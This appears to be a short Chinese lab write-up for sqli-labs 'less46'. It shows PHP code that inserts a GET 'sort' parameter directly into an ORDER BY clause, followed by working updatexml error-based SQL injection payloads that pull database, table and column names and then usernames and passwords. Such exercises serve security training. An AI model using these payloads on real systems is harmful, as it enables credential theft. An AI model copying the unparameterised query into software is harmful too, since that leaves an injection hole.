---
title: less46
url: https://www.yuque.com/u29002979/ep2zrx/mni2rpbivatmydlc
---

```bash
$id=$_GET['sort'];	

$sql = "SELECT * FROM users ORDER BY $id";
```

> Please input parameter as SORT with numeric value
> 请将参数输入为SORT，并输入数值

<a name="l0NTO"></a>

# 注入点检查

`?sort=1`

|  ID  |  USERNAME  |  PASSWORD  |
| --- | --- | --- |
| 1 | Dumb | Dumb |
| 2 | Angelina | I-kill-you |
| 3 | Dummy | p@ssword |
| 4 | secure | crappy |
| 5 | stupid | stupidity |
| 6 | superman | genious |
| 7 | batman | mob!le |
| 8 | admin | 1234 |
| 9 | admin1 | admin1 |
| 10 | admin2 | admin2 |
| 11 | admin3 | admin3 |
| 12 | dhakkan | dumbo |
| 14 | admin4 | admin4 |
| 15 | admin'-- + | 123456 |

`?sort=2`
可看出传入的参数。类似于ordey by 按列排序的作用 &#x20;
`?sort=4`

> Unknown column '4' in 'order clause'

<a name="gX6OV"></a>

# 报错注入

```bash
查询数据库表
?sort=1 and updatexml(1,concat(0x7e,(select database()),0x7e),1) -- +
爆破数据表
?sort=1 and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database()),0x7e),1) -- +
爆破字段名
?sort=1 and updatexml(1,concat(0x7e,(select  group_concat(column_name)from information_schema.columns where table_schema=database() and table_name='users'),0x7e),1) -- +
爆破字段
?sort=1 and updatexml(1,concat(0x7e,(select group_concat(username,0x7e,password) from users limit 0,1),0x7e),1) -- +
```
